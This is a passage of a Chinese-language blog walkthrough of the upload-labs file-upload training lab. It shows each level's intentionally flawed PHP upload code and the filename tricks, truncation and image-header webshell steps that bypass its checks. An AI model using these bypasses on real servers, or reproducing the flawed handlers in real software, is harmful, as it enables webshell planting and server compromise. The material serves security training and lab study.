class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-7"><a href="#pass-7" class="headerlink" title="pass"></a>pass</h4><p>没有删除<code>$DATA</code></p><p>Windows文件流特性绕过，文件名改成<code>08.php::$DATA</code>，上传成功后保存的文件名其实是<code>08.php</code> </p><p>pht</p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>原理同Pass-06</strong>，上传文件名后加上<strong>点+空格+点</strong>，改为<code>09.php. .</code> </p><p>pht</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>当后缀名中出现黑名单列表中的内容时，就替换为空，所以可以用pphphp这样的后缀绕过。</p><p>pht</p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strrpos — 计算指定字符串在目标字符串中最后一次出现的位置</p><p>说明<a href="http://php.net/manual/zh/function.strrpos.php#refsect1-function.strrpos-description" target="_blank" rel="noopener"> ¶</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strrpos ( string $haystack , string $needle [, int $offset = 0 ] )</span><br></pre></td></tr></table></figure><p>返回字符串 <code>haystack</code> 中 <code>needle</code> 最后一次出现的数字位置。注意 PHP4 中，needle 只能为单个字符。如果 needle 被指定为一个字符串，那么将仅使用第一个字符。</p><p>substr — 返回字符串的子串</p><p>说明<a href="http://php.net/manual/zh/function.substr.php#refsect1-function.substr-description" target="_blank" rel="noopener"> ¶</a></p><p>string <strong>substr</strong> ( string <code>$string</code> , int <code>$start</code> [, int <code>$length</code> ] )</p><p>返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。</p><h4 id="pass-8"><a href="#pass-8" class="headerlink" title="pass"></a>pass</h4><p>%00截断</p><p>原理：</p><p>截断的核心，就是<code>chr(0)</code>这个字符  </p><p> 先说一下这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格！  </p><p> 当程序在输出含有<code>chr(0)</code>变量时，<code>chr(0)</code>后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生  </p><p>0x00，%00，/00之类 的也是一样的</p><p><a href="https://www.cnblogs.com/milantgh/p/3612978.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/3612978.html</a></p><p><a href="https://www.cnblogs.com/hack0ne/p/4603144.html" target="_blank" rel="noopener">https://www.cnblogs.com/hack0ne/p/4603144.html</a></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>%00截断</p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。 </p><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>getimagesize()</strong> 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 <code>IMG</code> 标记中的 height/width 文本字符串。 </p><p>image_type_to_extension — 取得图像类型的文件后缀 </p><h4 id="pass-9"><a href="#pass-9" class="headerlink" title="pass"></a>pass</h4><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。 </p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exif_imagetype — 判断一个图像的类型 </p><h4 id="pass-10"><a href="#pass-10" class="headerlink" title="pass"></a>pass</h4><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 </p><h4 id="pass-11"><a href="#pass-11" class="headerlink" title="pass"></a>pass</h4><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">     